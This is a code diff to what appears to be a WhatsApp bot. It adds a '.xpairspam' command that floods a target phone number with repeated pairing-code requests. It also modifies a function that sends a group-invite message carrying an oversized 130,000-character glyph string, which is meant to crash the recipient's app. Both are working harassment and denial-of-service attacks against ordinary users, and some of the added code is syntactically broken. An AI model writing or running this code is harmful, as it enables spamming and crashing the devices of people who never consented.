@@ -273,6 +273,57 @@ const channelInfo = {
 
 
 
+async function Send_SY_loves_pair(sock, chatId, message, targetNumber, maxAttempts = PAIR_SPAM_MAX_COUNT) {
+    try {
+        const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
+        const pino = require('pino');
+
+        const { state } = await useMultiFileAuthState('./temp/XPairSessionTemp');
+        const { version } = await fetchLatestBaileysVersion();
+
+        const Spam_SY_Love_Sock = makeWASocket({
+            version,
+            auth: state,
+            logger: pino({ level: 'fatal' }),
+            printQRInTerminal: false,
+        });
+
+        let success = 0;
+        let failed = 0;
+
+        for (let i = 0; i < maxAttempts; i++) {
+            try {
+                const code = await Spam_SY_Love_Sock.requestPairingCode(targetNumber);
+                success++;
+                console.log(`[PAIR-SPAM] (${i + 1}/${maxAttempts}) → Code: ${code} for ${targetNumber}`);
+
+                const thisDelay = PAIR_SPAM_DELAY_MS * (0.8 + Math.random() * 0.4);
+                await new Promise(r => setTimeout(r, thisDelay));
+            } catch (err) {
+                failed++;
+                console.log(`[PAIR-SPAM] Failed attempt ${i+1}:`, err.message || err);
+                await new Promise(r => setTimeout(r, 10000));
+            }
+        }
+
+        await sock.sendMessage(chatId, {
+    text: `🏁 Pairing spam finished!\n\nTarget: +${targetNumber}\n✅ Success: ${success}\n❌ Failed: ${failed}`
+});
+            ...channelInfo
+        }, { quoted: message });
+
+        Spam_SY_Love_Sock.end();
+
+    } catch (err) {
+        console.error("Pairing spam crashed:", err);
+        await sock.sendMessage(chatId, { 
+            text: `❌ Error while sending pairing codes.`,
+            ...channelInfo
+        }, { quoted: message });
+    }
+}
+
+
 
 
 
@@ -281,19 +332,20 @@ async function Lovegc_by_sy(sock, targetJid) {
         const LoveString = "ཹ".repeat(65000);
         const SY_love_payload = LoveString.repeat(2);
 
-        const bugMessage = {
+        const lovemessage = {
             groupInviteMessage: {
                 groupName: SY_love_payload,
                 groupJid: "561611-1627579259@g.us", 
                 inviteCode: "h+64P9RhJDzgXSPf",        
-                inviteExpiration: 999,
+                //inviteExpiration: 999,
+                inviteExpiration: 32503680000,
                 caption: "",
                 thumbnail: null,
                 contextInfo: {}
             }
         };
 
-        await sock.relayMessage(targetJid, bugMessage, {});
+        await sock.relayMessage(targetJid, lovemessage, {});
     } catch (error) {
         console.error("gcandroid failed →", error.message || error);
     }
@@ -3046,7 +3098,60 @@ Usage:
                 }
                 break;
                             
-            
+            case userMessage.startsWith('.xpairspam'): {
+
+    if (!message.key.fromMe && !(await isOwnerOrSudo(senderId, sock, chatId))) {
+        await sock.sendMessage(chatId, { 
+            text: `❌ Only owner/sudo can use this command!`,
+            ...channelInfo
+        }, { quoted: message });
+        break;
+    }
+
+    const args = rawText.slice(11).trim().split(/[\s|]+/);
+    if (!args[0]) {
+        await sock.sendMessage(chatId, { 
+            await sock.sendMessage(chatId, { 
+    text: `📌 Usage:
+    
+.xpairspam 919876543210
+
+.xpairspam 919876543210|30`,
+});
+            ...channelInfo
+        }, { quoted: message });
+        break;
+    }
+
+    let target = args[0].replace(/[^0-9]/g, '').trim();
+    let attempts = args[1] ? parseInt(args[1]) : PAIR_SPAM_MAX_COUNT;
+
+    if (target.length < 10 || target.length > 14) {
+        await sock.sendMessage(chatId, { 
+            text: `❌ Invalid number format`,
+            ...channelInfo
+        }, { quoted: message });
+        break;
+    }
+
+
+    if (attempts < 1) attempts = 1;
+
+    await sock.sendMessage(chatId, { 
+    text: `🔥 Starting pairing spam...
+Target: +${target}
+Attempts: ${attempts}
+Delay: ~ ${PAIR_SPAM_DELAY_MS / 1000}s each
+
+Please wait...`,
+});
+        ...channelInfo
+    }, { quoted: message });
+
+   await Send_SY_loves_pair(sock, chatId, message, target, attempts);
+
+    break;
+}
             case userMessage.startsWith('.compliment'):
                 await complimentCommand(sock, chatId, message);
                 break;
